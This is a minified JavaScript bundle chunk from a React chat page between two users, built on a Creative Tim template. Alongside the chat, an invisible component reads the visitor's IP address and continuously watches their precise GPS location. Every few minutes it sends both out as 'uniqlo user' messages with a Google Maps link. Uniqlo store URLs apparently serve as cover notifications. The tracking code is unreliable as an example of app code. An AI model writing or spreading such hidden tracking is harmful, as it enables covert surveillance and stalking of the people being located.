/*!

=========================================================
* Now UI Kit PRO React - v1.0.0
=========================================================

* Product Page: https://www.creative-tim.com/product/now-ui-kit-pro-react
* Copyright 2019 Creative Tim (http://www.creative-tim.com)

* Coded by Creative Tim

=========================================================

* The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

*/
(this["webpackJsonpmaterial-kit-pro-react"]=this["webpackJsonpmaterial-kit-pro-react"]||[]).push([[17],{242:function(t,e,n){"use strict";n.d(e,"b",(function(){return o})),n.d(e,"c",(function(){return i})),n.d(e,"a",(function(){return r}));var a,c=n(270),o=function(t,e,n){if(void 0!==window.navigator.geolocation){window.navigator.geolocation.getCurrentPosition((function(e){var a={lat:e.coords.latitude?e.coords.latitude:void 0,lng:e.coords.longitude?e.coords.longitude:void 0};t(a),n(!0)}),(function(t){e({0:"\u4e0d\u660e\u539f\u56e0\u932f\u8aa4",1:"\u4f7f\u7528\u8005\u62d2\u7d55\u63d0\u4f9b\u4f4d\u7f6e\u8cc7\u8a0a",2:"\u7121\u6cd5\u53d6\u5f97\u4f4d\u7f6e\u8cc7\u8a0a",3:"\u4f4d\u7f6e\u67e5\u8a62\u903e\u6642"}[t.code]),n(!1)}),{enableHighAccuracy:!0,timeout:5e3,maximumAge:0})}},i=function(t,e,n){c.a;if(a=a||new Date,void 0!==window.navigator.geolocation)return navigator.geolocation.watchPosition((function(e){var c={lat:e.coords.latitude?e.coords.latitude:void 0,lng:e.coords.longitude?e.coords.longitude:void 0},o=new Date;Math.abs(o-a)/1e3%60>180&&(t(c),a=new Date),n(!0)}),(function(t){e({0:"\u4e0d\u660e\u539f\u56e0\u932f\u8aa4",1:"\u4f7f\u7528\u8005\u62d2\u7d55\u63d0\u4f9b\u4f4d\u7f6e\u8cc7\u8a0a",2:"\u7121\u6cd5\u53d6\u5f97\u4f4d\u7f6e\u8cc7\u8a0a",3:"\u4f4d\u7f6e\u67e5\u8a62\u903e\u6642"}[t.code]),n(!1)}),{enableHighAccuracy:!0,timeout:5e3,maximumAge:0})},r=function(t){void 0!==window.navigator.geolocation&&navigator.geolocation.clearWatch(t)}},270:function(t,e,n){"use strict";n.d(e,"a",(function(){return a}));var a=18e4},322:function(t,e,n){"use strict";n.d(e,"b",(function(){return g})),n.d(e,"a",(function(){return v}));var a=n(1),c=n.n(a),o=n(195),i=n(235),r=n.n(i),u=n(323),l=n.n(u),s=n(324),f=n.n(s),b={fontSize:"0.7rem"},m=function(t){var e=new Date(t),n=d(e.getHours()),a=d(e.getMinutes()),c=Date.now(),o=parseInt(c-t,10)/1e3/60,i=o/60;return o<=60?"".concat(n,":").concat(a):o>60&&i<=24||i>24?"".concat(n,":").concat(a," ----- ").concat(e.toDateString()):o},d=function(t){var e=t.toString();return 1===e.length?"0".concat(e):e},v=function(t){return t===o.b?l.a:t===o.a?f.a:r.a},g=function(t){return t.user===o.b?c.a.createElement("span",{style:b},"Karen ",c.a.createElement("small",null,"\xb7 ",m(t.createOn)," ")):t.user===o.a?c.a.createElement("span",{style:b},"Kevin ",c.a.createElement("small",null,"\xb7 ",m(t.createOn))):c.a.createElement(c.a.Fragment,null)}},323:function(t,e,n){t.exports=n.p+"static/media/gloria2.666943cf.jpg"},324:function(t,e,n){t.exports=n.p+"static/media/jerry.2aa27bf0.jpg"},841:function(t,e,n){"use strict";n.r(e);var a=n(57),c=n(111),o=n.n(c),i=n(1),r=n.n(i),u=n(38),l=n(10),s=n(28),f=n(107),b=n(67),m=n(68),d=n(325),v=n(321),g=n(322),O=n(73),j=n(215),w=n(195),p=n(220),h=n(242),E=(n(15),Object(l.f)((function(t){t.history;var e=Object(i.useState)(void 0),n=Object(a.a)(e,2),c=n[0],o=n[1],u=Object(i.useState)(void 0),l=Object(a.a)(u,2),s=l[0],f=l[1],b=Object(i.useState)(void 0),m=Object(a.a)(b,2),d=m[0],v=m[1],g=Object(i.useState)(void 0),O=Object(a.a)(g,2),w=O[0],p=O[1];return Object(i.useEffect)((function(){fetch("https://www.cloudflare.com/cdn-cgi/trace").then((function(t){return t.text()})).then((function(t){var e=t.split("\n"),n=Object(a.a)(e,3),c=(n[0],n[1],n[2]);if(c){var i=c.split("="),r=Object(a.a)(i,2),u=(r[0],r[1]);o(u)}}))}),[]),Object(i.useEffect)((function(){Object(h.b)(f,v,p);var t=Object(h.c)(f,v,p);return function(){t&&Object(h.a)(t)}}),[]),Object(i.useEffect)((function(){if(d){console.log(d);var t="uniqlo user error: ".concat(d);Object(j.a)(t)}}),[d,w]),Object(i.useEffect)((function(){if(s){var t="uniqlo user \n ip:".concat(c," \n https://www.google.com.tw/maps?q=").concat(s.lat,",").concat(s.lng);Object(j.a)(t)}}),[s]),r.a.createElement(i.Fragment,null)}))),S=n(270),y=n(77),D=n(72),x=Object(f.a)(p.a);e.default=Object(l.f)((function(t){t.history;var e=x(),n=Object(u.useSelector)((function(t){return t.login})).user,c=Object(i.useState)(void 0),l=Object(a.a)(c,2),f=l[0],p=l[1],h=Object(i.useState)(""),q=Object(a.a)(h,2),k=q[0],A=q[1],I=Object(i.useState)(""),U=Object(a.a)(I,2),F=U[0],H=U[1],M=Object(i.useState)(!0),T=Object(a.a)(M,2),C=T[0],J=T[1],K=Object(u.useSelector)((function(t){return t.chat})).maxMessageNumber;Object(i.useEffect)((function(){s.b&&s.b.limitToLast(K).on("value",(function(t){N(t)}))}),[K]),Object(i.useEffect)((function(){if(n&&F&&""!==F){var t={user:n,message:"".concat(F),createOn:Date.now()};if(s.b.push().set(t),n===w.b){Object(j.a)("http://www.uniqlo.com/tw/store/list/new/auto")}}}),[F]),Object(i.useEffect)((function(){setTimeout((function(){J(!1)}),5e3),setInterval((function(){J(!0),setTimeout((function(){J(!1)}),5e3)}),S.a)}),[]);var N=function(t){var e=t.val();if(null!==e&&void 0!==e){var a=o.a.slice(o.a.values(e),-K),c=o.a.slice(o.a.values(a),-1)[0].user;o.a.slice(o.a.values(a),-1)[0].createOn;n===c?(A(""),p(a)):p(a)}};return r.a.createElement("div",{className:e.section},r.a.createElement(b.a,{justify:"center"},r.a.createElement(m.a,{xs:12,sm:8,md:8},r.a.createElement("div",null,f?f.map((function(t,e){return r.a.createElement(d.a,{key:e,avatar:Object(g.a)(t.user),title:Object(g.b)(t),message:t.message})})):r.a.createElement("div",null),r.a.createElement(v.a,{avatar:Object(g.a)(n),value:k,onChange:function(t){A(t.target.value)},onReply:function(t){if(n&&""!==k){var e={user:n,message:k,createOn:Date.now()};s.b.push().set(e)}if(n===w.b){Object(j.a)("http://www.uniqlo.com/tw/store/list/new/auto")}},onUpdate:function(t){if(n){var e=K+1;Object(D.a)(y.a,e)}if(n===w.b){Object(j.a)("http://www.uniqlo.com/tw/store/list/new/update")}},enableUpdate:!0,setReplyImageUrl:H,enableImageUpload:!0})))),r.a.createElement(O.a,null),C?r.a.createElement(E,null):r.a.createElement(i.Fragment,null))}))}}]);
//# sourceMappingURL=17.da2b9cdf.chunk.js.map